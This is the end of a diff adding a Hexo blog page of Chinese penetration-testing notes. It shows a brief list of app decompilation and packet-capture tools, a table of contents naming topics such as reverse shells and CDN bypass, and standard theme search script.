+</ol>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><hr>
+<h2 id="内在搜索："><a href="#内在搜索：" class="headerlink" title="内在搜索："></a>内在搜索：</h2><h3 id="appinfoScanner自动反编译"><a href="#appinfoScanner自动反编译" class="headerlink" title="appinfoScanner自动反编译"></a>appinfoScanner自动反编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">移动端，ios，web，hs。静态网站信息收集工具。基本信息收集，title。dormain。cdn。指纹信息。状态信息，内在提取。反编译收集</span><br></pre></td></tr></table></figure>
+
+<h3 id="idea手动反编译内在搜索"><a href="#idea手动反编译内在搜索" class="headerlink" title="idea手动反编译内在搜索"></a>idea手动反编译内在搜索</h3><h3 id="安卓修改大师"><a href="#安卓修改大师" class="headerlink" title="安卓修改大师"></a>安卓修改大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以连接真机去抓包</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/12/11/linux%E8%BF%90%E7%BB%B4%E6%8A%80%E6%9C%AF/" rel="next" title="linux运维技术">
+                <i class="fa fa-chevron-left"></i> linux运维技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/12/17/php%E5%BC%80%E5%8F%91/" rel="prev" title="php开发">
+                php开发 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="" />
+          <p class="site-author-name" itemprop="name"></p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Nc%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">1.Nc瑞士军刀使用详解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-tcp%E7%9B%91%E5%90%AC"><span class="nav-number">1.1.</span> <span class="nav-text">1.tcp监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">2.传文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-nc%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.3.</span> <span class="nav-text">3.nc反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="nav-number">2.</span> <span class="nav-text">2.加解密</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%9C%E6%96%87%E5%AD%97%E5%8A%A0%E5%AF%86%EF%BC%9Aaaencode"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">颜文字加密：aaencode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E9%87%8C%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF"><span class="nav-number">2.0.0.2.</span> <span class="nav-text">图片里包含文件的技术</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E5%88%A4%E6%96%AD%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.</span> <span class="nav-text">3.判断操作系统</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ttl"><span class="nav-number">3.1.</span> <span class="nav-text">ttl</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E5%AE%9A"><span class="nav-number">4.</span> <span class="nav-text">4.数据库判定</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E4%B8%BB%E5%8A%A8%E6%89%93%E7%82%B9%E5%92%8C%E8%A2%AB%E5%8A%A8%E6%89%93%E7%82%B9"><span class="nav-number">5.</span> <span class="nav-text">5.主动打点和被动打点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-%E6%94%B6%E9%9B%86"><span class="nav-number">6.</span> <span class="nav-text">6.收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-number">6.1.</span> <span class="nav-text">操作系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"><span class="nav-number">6.2.</span> <span class="nav-text">脚本语言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">6.3.</span> <span class="nav-text">数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%90%8D%E7%A7%B0"><span class="nav-number">6.4.</span> <span class="nav-text">源码名称</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-%E6%B3%84%E9%9C%B2%E5%8E%9F%E7%A0%81%EF%BC%88cms%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">7.泄露原码（cms找不到的情况）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#git%E5%92%8Csvn"><span class="nav-number">7.1.</span> <span class="nav-text">git和svn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E5%A4%87%E4%BB%BD"><span class="nav-number">7.2.</span> <span class="nav-text">目录备份</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DsStore"><span class="nav-number">7.3.</span> <span class="nav-text">DsStore</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="nav-number">7.4.</span> <span class="nav-text">PHP源码泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-INF-web-xml"><span class="nav-number">7.5.</span> <span class="nav-text">WEB-INF&#x2F;web.xml</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">8.</span> <span class="nav-text">8.信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9%E3%80%82%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">9.</span> <span class="nav-text">9。端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10-%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="nav-number">10.</span> <span class="nav-text">10.端口渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#11-c%E6%AE%B5-%E6%97%81%E6%B3%A8"><span class="nav-number">11.</span> <span class="nav-text">11.c段&#x2F;旁注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%81%E6%B3%A8"><span class="nav-number">11.1.</span> <span class="nav-text">旁注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c%E6%AE%B5"><span class="nav-number">11.2.</span> <span class="nav-text">c段</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cdn%E5%88%A4%E6%96%AD"><span class="nav-number">12.</span> <span class="nav-text">cdn判断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#waf%E5%88%A4%E6%96%AD"><span class="nav-number">13.</span> <span class="nav-text">waf判断</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"><span class="nav-number">13.1.</span> <span class="nav-text">负载均衡</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cdn%E7%BB%95%E8%BF%87"><span class="nav-number">14.</span> <span class="nav-text">cdn绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">14.1.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%9B%E9%80%BC%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-number">14.1.1.</span> <span class="nav-text">牛逼的工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BE%E5%88%B0cdn%E5%90%8E%E5%92%8B%E5%8A%9E%EF%BC%9F"><span class="nav-number">14.1.2.</span> <span class="nav-text">找到cdn后咋办？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">15.</span> <span class="nav-text">正向连接和反向连接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">15.1.</span> <span class="nav-text">正向连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">15.2.</span> <span class="nav-text">反向连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%86%E5%90%91%E6%96%B9%E5%90%91"><span class="nav-number">16.</span> <span class="nav-text">逆向方向</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="nav-number">16.1.</span> <span class="nav-text">代码分析&amp;抓包分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">17.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%9C%A8%E6%90%9C%E7%B4%A2%EF%BC%9A"><span class="nav-number">17.1.</span> <span class="nav-text">内在搜索：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#appinfoScanner%E8%87%AA%E5%8A%A8%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">17.1.1.</span> <span class="nav-text">appinfoScanner自动反编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#idea%E6%89%8B%E5%8A%A8%E5%8F%8D%E7%BC%96%E8%AF%91%E5%86%85%E5%9C%A8%E6%90%9C%E7%B4%A2"><span class="nav-number">17.1.2.</span> <span class="nav-text">idea手动反编译内在搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%8D%93%E4%BF%AE%E6%94%B9%E5%A4%A7%E5%B8%88"><span class="nav-number">17.1.3.</span> <span class="nav-text">安卓修改大师</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">frozenfish</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Gemini
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
